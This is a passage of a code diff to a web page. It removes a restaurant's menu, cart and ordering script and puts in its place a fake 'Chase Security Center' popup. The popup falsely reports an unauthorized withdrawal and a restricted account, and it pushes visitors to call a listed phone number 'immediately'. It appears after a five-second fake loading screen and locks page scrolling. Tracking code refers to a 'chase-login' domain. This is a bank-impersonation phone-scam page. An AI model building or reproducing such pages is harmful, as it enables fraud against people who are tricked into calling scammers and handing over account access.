Masala",price:420,isVeg:!1,image:"https://images.unsplash.com/photo-1588166524941-3bf61a9c41db?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:420},{name:"Full",price:720}]}]},{id:"egg-curry",name:"Egg Curry (4 pcs)",price:250,isVeg:!1,image:"https://images.unsplash.com/photo-1585237625149-231570726a4f?q=80&w=800&auto=format&fit=crop"}]}}},"cat-momos":{title:"Momos",subCategories:{"paneer-momos":{title:"🥟 Paneer Momos (10 pcs)",items:[{id:"paneer-kurkure-momos",name:"Paneer Kurkure Momos",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1642821374521-3d5f3a3a4185?q=80&w=800&auto=format&fit=crop"},{id:"paneer-steam-momos",name:"Paneer Steam Momos",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1582879313824-c027111b156b?q=80&w=800&auto=format&fit=crop"},{id:"paneer-fried-momos",name:"Paneer Fried Momos",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1534422298391-e4f8c172dddb?q=80&w=800&auto=format&fit=crop"},{id:"paneer-afghani-momos",name:"Paneer Afghani Momos",price:180,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop"},{id:"paneer-malai-momos",name:"Paneer Malai Momos",price:180,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop"},{id:"paneer-gravy-momos",name:"Paneer Gravy Momos",price:200,isVeg:!0,image:"https://images.unsplash.com/photo-1642821374521-3d5f3a3a4185?q=80&w=800&auto=format&fit=crop"},{id:"paneer-chilli-momos",name:"Paneer Chilli Momos",price:220,isVeg:!0,image:"https://images.unsplash.com/photo-1642821374521-3d5f3a3a4185?q=80&w=800&auto=format&fit=crop"}]},"veg-momos":{title:"🥟 Veg Momos (10 pcs)",items:[{id:"veg-kurkure-momos",name:"Veg Kurkure Momos",price:110,isVeg:!0,image:"https://images.unsplash.com/photo-1642821374521-3d5f3a3a4185?q=80&w=800&auto=format&fit=crop"},{id:"veg-steam-momos",name:"Veg Steam Momos",price:80,isVeg:!0,image:"https://images.unsplash.com/photo-1582879313824-c027111b156b?q=80&w=800&auto=format&fit=crop"},{id:"veg-tandoori-momos",name:"Veg Tandoori Momos",price:100,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop"},{id:"veg-fried-momos",name:"Veg Fried Momos",price:110,isVeg:!0,image:"https://images.unsplash.com/photo-1534422298391-e4f8c172dddb?q=80&w=800&auto=format&fit=crop"},{id:"veg-afghani-momos",name:"Veg Afghani Momos",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop"},{id:"veg-malai-momos",name:"Veg Malai Momos",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop"},{id:"veg-gravy-momos",name:"Veg Gravy Momos",price:130,isVeg:!0,image:"https://images.unsplash.com/photo-1642821374521-3d5f3a3a4185?q=80&w=800&auto=format&fit=crop"},{id:"veg-chilli-momos",name:"Veg Chilli Momos",price:150,isVeg:!0,image:"https://images.unsplash.com/photo-1642821374521-3d5f3a3a4185?q=80&w=800&auto=format&fit=crop"}]}}},"cat-breads-biryani":{title:"Breads, Biryani & Rice",subCategories:{"breads":{title:"🍞 Best Of Indian Breads",items:[{id:"tandoori-roti",name:"Tandoori Roti",price:12,isVeg:!0,image:"https://images.unsplash.com/photo-1626202243224-b42162c62524?q=80&w=800&auto=format&fit=crop"},{id:"rumali-roti",name:"Rumali Roti",price:10,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop"},{id:"butter-roti",name:"Butter Roti",price:15,isVeg:!0,image:"https://images.unsplash.com/photo-1626202243224-b42162c62524?q=80&w=800&auto=format&fit=crop"},{id:"laccha-paratha",name:"Laccha Paratha",price:25,isVeg:!0,image:"https://images.unsplash.com/photo-1604329268241-55820871b7b7?q=80&w=800&auto=format&fit=crop"},{id:"plain-naan",name:"Plain Naan",price:30,isVeg:!0,image:"https://images.unsplash.com/photo-1626700051175-681901309327?q=80&w=800&auto=format&fit=crop"},{id:"butter-naan",name:"Butter Naan",price:40,isVeg:!0,image:"https://images.unsplash.com/photo-1626700051175-681901309327?q=80&w=800&auto=format&fit=crop"},{id:"onion-naan",name:"Onion Naan",price:50,isVeg:!0,image:"https://images.unsplash.com/photo-1626700051175-681901309327?q=80&w=800&auto=format&fit=crop"},{id:"stuffed-naan",name:"Stuffed Naan",price:60,isVeg:!0,image:"https://images.unsplash.com/photo-1604329268241-55820871b7b7?q=80&w=800&auto=format&fit=crop"},{id:"garlic-naan",name:"Garlic Naan",price:60,isVeg:!0,image:"https://images.unsplash.com/photo-1626700051175-681901309327?q=80&w=800&auto=format&fit=crop"},{id:"aloo-paratha",name:"Aloo Paratha",price:50,isVeg:!0,image:"https://images.unsplash.com/photo-1604329268241-55820871b7b7?q=80&w=800&auto=format&fit=crop"},{id:"chicken-keema-naan",name:"Chicken Keema Naan",price:90,isVeg:!1,image:"https://images.unsplash.com/photo-1626700051175-681901309327?q=80&w=800&auto=format&fit=crop"},{id:"paneer-paratha",name:"Paneer Paratha",price:70,isVeg:!0,image:"https://images.unsplash.com/photo-1604329268241-55820871b7b7?q=80&w=800&auto=format&fit=crop"},{id:"missi-roti",name:"Missi Roti",price:25,isVeg:!0,image:"https://images.unsplash.com/photo-1626202243224-b42162c62524?q=80&w=800&auto=format&fit=crop"}]},"biryani":{title:"🍲 Dum Biryani",items:[{id:"hyderabadi-chicken-biryani",name:"Hyderabadi Chicken Dum Biryani",price:249,isVeg:!1,image:"https://images.unsplash.com/photo-1589304242440-69a4731a547a?q=80&w=800&auto=format&fit=crop"},{id:"kolkatta-chicken-biryani",name:"Kolkatta Chicken Dum Biryani",price:299,isVeg:!1,image:"https://images.unsplash.com/photo-1589304242440-69a4731a547a?q=80&w=800&auto=format&fit=crop"},{id:"hyderabadi-veg-biryani",name:"Hyderabadi Veg Dum Biryani",price:149,isVeg:!0,image:"https://images.unsplash.com/photo-1630409347829-95993b18e47f?q=80&w=800&auto=format&fit=crop"},{id:"paneer-tikka-biryani",name:"Paneer Tikka Dum Biryani",price:199,isVeg:!0,image:"https://images.unsplash.com/photo-1630409347829-95993b18e47f?q=80&w=800&auto=format&fit=crop"},{id:"egg-biryani",name:"Egg Dum Biryani",price:199,isVeg:!1,image:"https://images.unsplash.com/photo-1630409347829-95993b18e47f?q=80&w=800&auto=format&fit=crop"},{id:"soya-chaap-biryani",name:"Soya Chaap Dum Biryani",price:190,isVeg:!0,image:"https://images.unsplash.com/photo-1630409347829-95993b18e47f?q=80&w=800&auto=format&fit=crop"}]},"rice":{title:"🍚 Rice",items:[{id:"egg-fried-rice",name:"Egg Fried Rice",price:170,isVeg:!1,image:"https://images.unsplash.com/photo-1582576161399-23d357d38e07?q=80&w=800&auto=format&fit=crop"},{id:"veg-fried-rice",name:"Veg Fried Rice",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1582576161399-23d357d38e07?q=80&w=800&auto=format&fit=crop"},{id:"jeera-rice",name:"Jeera Rice",price:130,isVeg:!0,image:"https://images.unsplash.com/photo-1626700051175-681901309327?q=80&w=800&auto=format&fit=crop"},{id:"steam-rice",name:"Steam Rice",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1536304993881-ff6e9eefa2a6?q=80&w=800&auto=format&fit=crop"},{id:"veg-schezwan-rice",name:"Veg Schezwan Rice",price:150,isVeg:!0,image:"https://images.unsplash.com/photo-1582576161399-23d357d38e07?q=80&w=800&auto=format&fit=crop"},{id:"chicken-fried-rice",name:"Chicken Fried Rice",price:220,isVeg:!1,image:"https://images.unsplash.com/photo-1582576161399-23d357d38e07?q=80&w=800&auto=format&fit=crop"},{id:"chicken-schezwan-rice",name:"Chicken Schezwan Rice",price:260,isVeg:!1,image:"https://images.unsplash.com/photo-1582576161399-23d357d38e07?q=80&w=800&auto=format&fit=crop"}]}}},"cat-chinese-pasta":{title:"Chinese, Noodles & Pasta",subCategories:{"noodles":{title:"🍜 Noodles",items:[{id:"veg-noodles",name:"Veg Noodles",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1585032226651-759b368d7246?q=80&w=800&auto=format&fit=crop"},{id:"veg-hakka-noodles",name:"Veg Hakka Noodles",price:150,isVeg:!0,image:"https://images.unsplash.com/photo-1585032226651-759b368d7246?q=80&w=800&auto=format&fit=crop"},{id:"veg-schezwan-noodles",name:"Veg Schezwan Noodles",price:150,isVeg:!0,image:"https://images.unsplash.com/photo-1585032226651-759b368d7246?q=80&w=800&auto=format&fit=crop"},{id:"chilli-garlic-noodles",name:"Chilli Garlic Noodles",price:150,isVeg:!0,image:"https://images.unsplash.com/photo-1585032226651-759b368d7246?q=80&w=800&auto=format&fit=crop"},{id:"singapori-noodles",name:"Singapori Noodles",price:150,isVeg:!0,image:"https://images.unsplash.com/photo-1585032226651-759b368d7246?q=80&w=800&auto=format&fit=crop"},{id:"paneer-noodles",name:"Paneer Noodles",price:170,isVeg:!0,image:"https://images.unsplash.com/photo-1585032226651-759b368d7246?q=80&w=800&auto=format&fit=crop"},{id:"egg-noodles",name:"Egg Noodles",price:170,isVeg:!1,image:"https://images.unsplash.com/photo-1585032226651-759b368d7246?q=80&w=800&auto=format&fit=crop"}]},"chinese-delights":{title:"🥢 Chinese Delights",items:[{id:"veg-manchurian-dry",name:"Veg Manchurian Dry",price:180,isVeg:!0,image:"https://images.unsplash.com/photo-1658463878411-2a21e9a26374?q=80&w=800&auto=format&fit=crop"},{id:"veg-manchurian-gravy",name:"Veg Manchurian Gravy",price:200,isVeg:!0,image:"https://images.unsplash.com/photo-1658463878411-2a21e9a26374?q=80&w=800&auto=format&fit=crop"},{id:"crispy-chilli-honey-potato",name:"Crispy Chilli Honey Potato",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1599487488170-d11ec9c172f0?q=80&w=800&auto=format&fit=crop"},{id:"chilli-paneer-gravy",name:"Chilli Paneer Gravy",price:220,isVeg:!0,image:"https://images.unsplash.com/photo-1599487488170-d11ec9c172f0?q=80&w=800&auto=format&fit=crop"},{id:"chilli-paneer-dry",name:"Chilli Paneer (Dry)",price:200,isVeg:!0,image:"https://images.unsplash.com/photo-1599487488170-d11ec9c172f0?q=80&w=800&auto=format&fit=crop"},{id:"french-fries",name:"French Fries",price:100,isVeg:!0,image:"https://images.unsplash.com/photo-1585109649234-36a9239233f0?q=80&w=800&auto=format&fit=crop"},{id:"chilli-gobi-dry",name:"Chilli Gobi Dry",price:190,isVeg:!0,image:"https://images.unsplash.com/photo-1599487488170-d11ec9c172f0?q=80&w=800&auto=format&fit=crop"},{id:"chilli-potato",name:"Chilli Potato",price:130,isVeg:!0,image:"https://images.unsplash.com/photo-1599487488170-d11ec9c172f0?q=80&w=800&auto=format&fit=crop"}]},"pasta":{title:"🍝 Pasta K's Special",items:[{id:"mix-pasta",name:"Mix Pasta Mac & Cheese",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1551183053-bf91a1d81141?q=80&w=800&auto=format&fit=crop"},{id:"red-sauce-pasta",name:"Red Sauce Pasta Mac & Cheese",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1551183053-bf91a1d81141?q=80&w=800&auto=format&fit=crop"},{id:"white-sauce-pasta",name:"White Sauce Pasta Mac & Cheese",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1551183053-bf91a1d81141?q=80&w=800&auto=format&fit=crop"},{id:"chicken-mix-pasta",name:"Chicken Mix Pasta Mac & Cheese",price:180,isVeg:!1,image:"https://images.unsplash.com/photo-1551183053-bf91a1d81141?q=80&w=800&auto=format&fit=crop"},{id:"chicken-red-sauce-pasta",name:"Chicken Red Sauce Pasta Mac & Cheese",price:180,isVeg:!1,image:"https://images.unsplash.com/photo-1551183053-bf91a1d81141?q=80&w=800&auto=format&fit=crop"},{id:"chicken-white-sauce-pasta",name:"Chicken White Sauce Pasta Mac & Cheese",price:180,isVeg:!1,image:"https://images.unsplash.com/photo-1551183053-bf91a1d81141?q=80&w=800&auto=format&fit=crop"}]}}}};
-
-    let cart = [];
-    let currentModalItem = {};
-
-    function generateMenu() {
-        const container = document.getElementById('menu-container');
-        const nav = document.getElementById('category-nav');
-        if (!container || !nav) return;
-        container.innerHTML = '';
-        nav.innerHTML = '';
-        for (const catId in menuData) {
-            const category = menuData[catId];
-            const section = document.createElement('section');
-            section.id = catId;
-            section.innerHTML = `<h2 class="main-category-title">${category.title}</h2>`;
-            nav.innerHTML += `<a href="#${catId}">${category.title}</a>`;
-            if (category.subCategories) {
-                for (const subCatId in category.subCategories) {
-                    const subCategory = category.subCategories[subCatId];
-                    section.innerHTML += `<h3 class="sub-category-title">${subCategory.title}</h3>`;
-                    subCategory.items.forEach(item => section.appendChild(createItemElement(item)));
-                }
-            } else {
-                if(category.items) { // Robustness check
-                    category.items.forEach(item => section.appendChild(createItemElement(item)));
-                }
-            }
-            container.appendChild(section);
-        }
-    }
-
-    function createItemElement(item) {
-        const itemCard = document.createElement('div');
-        itemCard.className = 'item-card';
-        itemCard.id = `item-${item.id}`;
-        const priceText = item.options ? `₹${item.price} onwards` : `₹${item.price}`;
-        const vegIndicator = `<span class="item-veg-indicator ${item.isVeg ? 'veg' : 'non-veg'}"></span>`;
-        itemCard.innerHTML = `
-            <div class="item-details">
-                <div>${vegIndicator}<span class="item-name">${item.name}</span></div>
-                <div class="item-price">${priceText}</div>
-            </div>
-            <div class="item-image-cta-wrapper">
-                <img src="${item.image}" alt="${item.name}" class="item-image">
-                <div class="item-cta"></div>
-            </div>`;
-        const wrapper = itemCard.querySelector('.item-cta');
-        const addButton = document.createElement('button');
-        addButton.className = 'add-btn';
-        addButton.textContent = 'ADD';
-        addButton.onclick = () => item.options ? showOptionsModal(item) : addItem(item.id, item.name, item.price);
-        wrapper.appendChild(addButton);
-        return itemCard;
-    }
-
-    function showOptionsModal(item) {
-        currentModalItem = item;
-        document.getElementById('modalItemName').textContent = currentModalItem.name;
-        const modalBody = document.getElementById('modalBody');
-        modalBody.innerHTML = '';
-        (item.options || []).forEach(group => {
-            const groupDiv = document.createElement('div');
-            groupDiv.className = 'option-group';
-            groupDiv.innerHTML = `<h3>${group.group}${group.required ? '<span class="required-tag"> REQUIRED</span>' : ''}</h3>`;
-            group.choices.forEach((choice, index) => {
-                const isChecked = group.type === 'radio' && index === 0 ? 'checked' : '';
-                const choiceId = `${group.group.replace(/\s+/g, '-')}-${index}`;
-                groupDiv.innerHTML += `<div class="option-choice"><label><input type="${group.type}" id="${choiceId}" name="${group.group}" value="${choice.price}" data-name="${choice.name}" onchange="updateModalPrice()" ${isChecked}><span>${choice.name}</span></label><span>₹${choice.price}</span></div>`;
-            });
-            modalBody.appendChild(groupDiv);
-        });
-        updateModalPrice();
-        document.getElementById('optionsModal').style.display = 'block';
-    }
-
-    function updateModalPrice() {
-        let total = 0;
-        let isRequiredMet = true;
-        (currentModalItem.options || []).forEach(group => {
-            if (group.required && !document.querySelector(`#modalBody input[name="${group.group}"]:checked`)) {
-                isRequiredMet = false;
-            }
-        });
-        document.querySelectorAll('#modalBody input:checked').forEach(input => {
-            total += parseFloat(input.value);
-        });
-        const addButton = document.getElementById('modalAddItemBtn');
-        addButton.textContent = `Add Item - ₹${total.toFixed(2)}`;
-        addButton.disabled = !isRequiredMet;
-    }
-
-    document.getElementById('modalAddItemBtn').onclick = function() {
-        let finalPrice = 0;
-        let nameParts = [currentModalItem.name];
-        let idParts = [currentModalItem.id];
-        document.querySelectorAll('#modalBody input:checked').forEach(input => {
-            finalPrice += parseFloat(input.value);
-            nameParts.push(`(${input.dataset.name})`);
-            idParts.push(input.dataset.name.toLowerCase().replace(/\s+/g, '-'));
-        });
-        addItem(idParts.join('_'), nameParts.join(' '), finalPrice);
-        document.getElementById('optionsModal').style.display = 'none';
-    };
-
-    document.getElementById('optionsModal').onclick = function(event) {
-        if (event.target.id === 'optionsModal') {
-            event.target.style.display = 'none';
-        }
-    };
-
-    function addItem(id, name, price) {
-        const existingItem = cart.find(item => item.id === id);
-        if (existingItem) {
-            existingItem.quantity++;
-        } else {
-            cart.push({ id, name, price, quantity: 1, baseId: id.split('_')[0] });
-        }
-        updateMainDisplay();
-    }
-
-    function removeItem(id) {
-        const itemIndex = cart.findIndex(item => item.id === id);
-        if (itemIndex > -1) {
-            cart[itemIndex].quantity--;
-            if (cart[itemIndex].quantity === 0) {
-                cart.splice(itemIndex, 1);
-            }
-        }
-        updateMainDisplay();
-    }
-
-    function updateMainDisplay() {
-        const itemBaseIdCounts = cart.reduce((acc, item) => {
-            acc[item.baseId] = (acc[item.baseId] || 0) + item.quantity;
-            return acc;
-        }, {});
-        document.querySelectorAll('.item-cta').forEach(wrapper => {
-            const itemCard = wrapper.closest('.item-card');
-            if (!itemCard) return;
-            const baseId = itemCard.id.replace('item-', '');
-            const totalQty = itemBaseIdCounts[baseId] || 0;
-            if (totalQty > 0) {
-                wrapper.innerHTML = `<div class="quantity-control"><button onclick="removeLastAddedItem('${baseId}')">-</button><span class="quantity">${totalQty}</span><button onclick="reopenOptionsFor('${baseId}')">+</button></div>`;
-            } else {
-                const originalItem = findMenuItemById(baseId);
-                wrapper.innerHTML = `<button class="add-btn">ADD</button>`;
-                if (originalItem) {
-                    wrapper.querySelector('.add-btn').onclick = () => originalItem.options ? showOptionsModal(originalItem) : addItem(originalItem.id, originalItem.name, originalItem.price);
-                }
-            }
-        });
-        const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
-        const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-        const footerBtn = document.getElementById('footerCartBtn');
-        if (totalItems > 0) {
-            footerBtn.style.display = 'block';
-            footerBtn.innerHTML = `View Cart (${totalItems}) &nbsp;&nbsp;&nbsp; ₹${totalPrice.toFixed(2)}`;
-        } else {
-            footerBtn.style.display = 'none';
-        }
-    }
-
-    function removeLastAddedItem(baseId) {
-        for (let i = cart.length - 1; i >= 0; i--) {
-            if (cart[i].baseId === baseId) {
-                removeItem(cart[i].id);
-                break;
-            }
-        }
-    }
-
-    function reopenOptionsFor(baseId) {
-        const originalItem = findMenuItemById(baseId);
-        if (originalItem) {
-            originalItem.options ? showOptionsModal(originalItem) : addItem(originalItem.id, originalItem.name, originalItem.price);
-        }
-    }
-
-    function findMenuItemById(id) {
-        for (const catId in menuData) {
-            const category = menuData[catId];
-            if (category.subCategories) {
-                for (const subCatId in category.subCategories) {
-                    const found = category.subCategories[subCatId].items.find(item => item.id === id);
-                    if (found) return found;
-                }
-            } else {
-                 if(category.items) {
-                    const found = category.items.find(item => item.id === id);
-                    if (found) return found;
-                }
-            }
-        }
-        return null;
-    }
-
-    function showCheckoutForm() {
-        if (cart.length === 0) return;
-        const total = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-        document.getElementById("checkoutTotal").textContent = `₹${total.toFixed(2)}`;
-        const cartItemsList = document.getElementById("cartItemsList");
-        cartItemsList.innerHTML = '';
-        cart.forEach(item => {
-            const listItem = document.createElement('li');
-            listItem.textContent = `${item.quantity} x ${item.name}`;
-            cartItemsList.appendChild(listItem);
-        });
-        document.getElementById("checkoutModal").style.display = "flex";
-    }
+  <!-- Security Alert Popup with Chase Styling -->
+  <div id="security-popup">
+    <div class="chase-header">
+      <div class="chase-logo">
+        <div class="logo-square">
+          <span style="color: #117c45; font-size: 24px; font-weight: bold;">C</span>
+        </div>
+        <div class="logo-text">CHASE</div>
+      </div>
+      <h2>Security Center</h2>
+    </div>
     
-    document.getElementById('checkoutModal').onclick = function(event) {
-        if (event.target.id === 'checkoutModal') {
-            event.target.style.display = 'none';
-        }
-    };
+    <div class="content">
+      <div class="alert-icon">
+        <i class="fas fa-exclamation-triangle"></i>
+      </div>
+      <p class="urgent-text">Withdrawal activity detected from a different device!</p>
+      
+      <div class="alert-details">
+        <p><strong>Activity Type:</strong> Unauthorized withdrawal attempt</p>
+        <p><strong>Location:</strong> Asheville, NC (unrecognized device)</p>
+        <p><strong>Time:</strong> Today, 12:42 PM EDT</p>
+        <p><strong>Status:</strong> Account temporarily restricted</p>
+      </div>
+      
+      <p>We've detected suspicious activity on your account and have temporarily restricted access to protect your funds.</p>
+      <p>Please verify your identity immediately with our security team to restore access and prevent any transactions.</p>
+      
+      <div class="call-container">
+        <div class="call-title">Immediate Verification Required</div>
+        <a id="popup-call-btn" href="tel:+1-828-280-2950" class="pulse">
+          <i class="fas fa-phone"></i> CALL CHASE NOW
+        </a>
+        <div class="toll-free">Toll-Free: +1-828-280-2950</div>
+      </div>
+      
+      <div class="contact-info">
+        <p>Available 24/7 • Quick Response • Verified Security Team</p>
+      </div>
+      
+      <div class="security-tips">
+        <h3><i class="fas fa-shield-alt"></i> Security Tips:</h3>
+        <ul>
+          <li>Never share your verification codes with anyone</li>
+          <li>Ensure you're on the official Chase website</li>
+          <li>Monitor your account regularly for unusual activity</li>
+        </ul>
+      </div>
+    </div>
+  </div>
 
-    function submitOrder() {
-        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwC21gWG9YGdA4JCsYuT7r-duUAInpdapNst1WBjhWYI__PE4Ua5hrGy0CR_WtYlTHTpg/exec";
-        const name = document.getElementById("customerName").value.trim();
-        const phone = document.getElementById("customerPhone").value.trim();
-        const selectedOrderType = document.querySelector('input[name="orderType"]:checked');
+  <!-- Default Statcounter code for chase https://chase-login.pages.dev/ -->
+  <script type="text/javascript">
+  var sc_project=13166709; 
+  var sc_invisible=1; 
+  var sc_security="f4da39b8"; 
+  </script>
+  <script type="text/javascript"
+  src="https://www.statcounter.com/counter/counter.js" async></script>
+  <noscript><div class="statcounter"><a title="Web Analytics Made Easy -
+  Statcounter" href="https://statcounter.com/" target="_blank"><img
+  class="statcounter" src="https://c.statcounter.com/13166709/0/f4da39b8/1/"
+  alt="Web Analytics Made Easy - Statcounter"
+  referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+  <!-- End of Statcounter Code -->
 
-        if (!name || !phone) {
-            alert("Please fill in your name and phone number.");
-            return;
-        }
-        if (!selectedOrderType) {
-            alert("Please select Dine-in or Takeaway.");
-            return;
-        }
+  <script>
+    // Show loading screen with timer, then show the full-screen popup
+    document.addEventListener('DOMContentLoaded', function() {
+      const loadingScreen = document.querySelector('.loading-screen');
+      const popup = document.getElementById('security-popup');
+      
+      // After 5 seconds, hide loading screen and show popup
+      setTimeout(function() {
+        loadingScreen.style.display = 'none';
+        popup.style.display = "flex";
+        document.body.style.overflow = 'hidden';
         
-        const orderType = selectedOrderType.value;
-        const finalTotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-        const itemsSummary = cart.map(item => `${item.quantity} x ${item.name}`).join('\n');
+        // Add touch event listener for mobile devices
+        document.addEventListener('touchstart', function() {
+          // This helps prevent the default zoom behavior on mobile
+        }, { passive: true });
         
-        const orderData = {
-            timestamp: new Date().toISOString(),
-            name: `${name} (${orderType})`,
-            phone: phone,
-            orderType: orderType,
-            items: itemsSummary,
-            totalAmount: `₹${finalTotal.toFixed(2)}`
-        };
-
-        const submitButton = document.getElementById('submitBtn');
-        submitButton.disabled = true; 
-        submitButton.textContent = 'Placing Order...';
-        
-        fetch(GOOGLE_SCRIPT_URL, {
-            method: 'POST',
-            body: JSON.stringify(orderData)
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.result !== 'success') { throw new Error(data.message || 'The script reported an error.'); }
-            alert(`✅ Thank you, ${name}! Your order has been placed successfully!`);
-            cart = [];
-            updateMainDisplay();
-            document.getElementById('customerName').value = ''; 
-            document.getElementById('customerPhone').value = ''; 
-            document.getElementById("checkoutModal").style.display = "none";
-        })
-        .catch(error => { 
-            console.error("Error placing order:", error); 
-            alert("❌ A critical error occurred. Could not place your order. Please contact the restaurant directly."); 
-        })
-        .finally(() => { 
-            submitButton.disabled = false; 
-            submitButton.textContent = 'Place Order'; 
-        });
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-        generateMenu();
-        updateMainDisplay();
+      }, 5000);
     });
-</script>
+  </script>
+
 </body>
 </html>
